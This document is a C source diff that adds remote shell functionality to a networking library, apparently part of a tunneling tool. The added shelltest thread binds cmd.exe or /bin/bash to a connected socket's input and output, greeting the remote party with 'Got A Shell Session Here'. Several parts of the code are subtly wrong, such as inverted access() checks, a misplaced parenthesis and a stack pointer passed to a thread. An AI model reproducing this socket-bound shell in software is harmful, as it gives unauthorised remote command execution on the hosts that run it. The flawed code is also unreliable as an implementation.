@@ -1,5 +1,33 @@
 #include "BaseAPI.h"
+
+#define MAX_SHELL_PATH 255
+#define SET_SHELL_PATH_ERROR -1
+#define UNKNOWN_SHELL_PATH   -2
+#define SET_SHELL_PATH_OK     1
+
+char SHELL_FILE_PATH[MAX_SHELL_PATH];
 int usec_for_EW = 100000;
+
+int Set_Shell_Path_Value(){
+#ifdef WIN32
+    strncpy(SHELL_FILE_PATH,"cmd.exe",MAX_SHELL_PATH);
+#elif __linux__
+    // normal linux
+    if(access("/bin/bash",6)){
+        strncpy(SHELL_FILE_PATH,"/bin/bash",MAX_SHELL_PATH);
+    }
+    // android linux
+    else if( access("/system/bin/sh"),6){
+        strncpy(SHELL_FILE_PATH,"/system/bin/sh",MAX_SHELL_PATH);
+    }
+    else {
+        return SET_SHELL_PATH_ERROR;
+    }
+#else
+    return SET_SHELL_PATH_ERROR;
+#endif
+    return SET_SHELL_PATH_OK;
+}
 
 int API_env_init(){
 #ifdef WIN32
@@ -13,7 +41,10 @@ int API_env_init(){
 #else
     signal(SIGPIPE, SIG_IGN);
 #endif
-    return ENV_INIT_OK;
+    if (Set_Shell_Path_Value() == SET_SHELL_PATH_OK){
+        return ENV_INIT_OK;
+    }
+    return ENV_INIT_FALSE;
 }
 
 #ifndef __linux__
@@ -249,5 +280,63 @@ int API_set_usec_time(int usec){
 int API_get_usec_time(){
     return usec_for_EW;
 }
+///////////////////////////////////////////////////////////////////////////
+#define START_SHELLTHREAD_ERROR -1
+#define START_SHELLTHREAD_OK     1
+#define SHELL_WELCOME_MSG        "Got A Shell Session Here >>\n"
+#define SHELL_BYE_MSG            "GoodBye ! Shell Session Closed Now .\n"
+///////////////////////////////////////////////////////////////////////////
+MIC_THREAD_FUN_DEF (shelltest,socket){
+    int sock = *((int*)socket);
+    MIC_USLEEP(1);
+    printf("psocket = %8x\n",socket); 
+    printf("psocket = %d\n",*((int*)socket)); 
+    API_socket_send(sock,SHELL_WELCOME_MSG,strlen(SHELL_WELCOME_MSG));
+    printf("sock == %d\n",sock);
+#ifdef __linux__
+    int fpid;
+    printf("%s\n" ,SHELL_FILE_PATH);
+    fpid = fork();
+    
+    if(fpid<0){
+        printf("error \n");
+    }
+    else if( fpid == 0){
+        dup2(sock,2);
+        dup2(sock,1);
+        dup2(sock,0);
 
+        system(SHELL_FILE_PATH);
+        API_socket_send(sock,SHELL_BYE_MSG,strlen(SHELL_BYE_MSG));
+    }
+#elif __WIN32__
+    STARTUPINFO si;
+    PROCESS_INFORMATION  pi;
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
+    // API_socket_send(si.hStdOutput,"Hello Client\n",strlen("Hello Client\n"));
+    CreateProcess(
+        NULL, SHELL_FILE_PATH, NULL, NULL,
+        TRUE, 0, 0, NULL, &si, &pi
+    );
+    API_socket_send(sock,SHELL_BYE_MSG,strlen(SHELL_BYE_MSG));
+    API_socket_close(sock);
+#endif
+    MIC_THREAD_END();
+    return 0;
+}
 
+int API_Start_ShellThread_for_sock(int sock){
+    int sockbuf = sock;
+    MIC_THREAD_HANDLE_ID thread_id;
+    if( MIC_THREAD_CREATE(thread_id,shelltest,(void *) &sockbuf) <0){
+        API_socket_close(sockbuf);
+        return START_SHELLTHREAD_ERROR;
+    }
+    //  这个休眠很重要，否则子线程读取到的 sockbuf 
+    //  数据将会被清零，那时本线程已经执行完毕，占空间释放了。
+    MIC_USLEEP(5);
+    return START_SHELLTHREAD_OK;
+}
